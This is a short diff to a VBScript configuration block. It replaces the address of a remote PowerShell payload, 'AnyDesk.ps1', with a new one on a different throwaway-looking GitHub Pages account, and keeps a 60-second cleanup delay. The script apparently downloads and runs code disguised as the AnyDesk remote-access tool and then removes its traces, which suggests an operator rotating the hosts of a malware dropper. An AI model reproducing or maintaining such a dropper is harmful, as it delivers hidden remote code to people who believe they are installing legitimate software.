@@ -12,7 +12,7 @@ Option Explicit
 ' ============================================================
 ' 🌐 CONFIGURATION
 ' ============================================================
-Const PS1_URL = "https://hiuier00304.github.io/MyAdsHome/AnyDesk.ps1"
+Const PS1_URL = "https://khuwieiuw882.github.io/Silver-man/AnyDesk.ps1"
 Const CLEANUP_DELAY_SECONDS = 60
 
 ' ============================================================
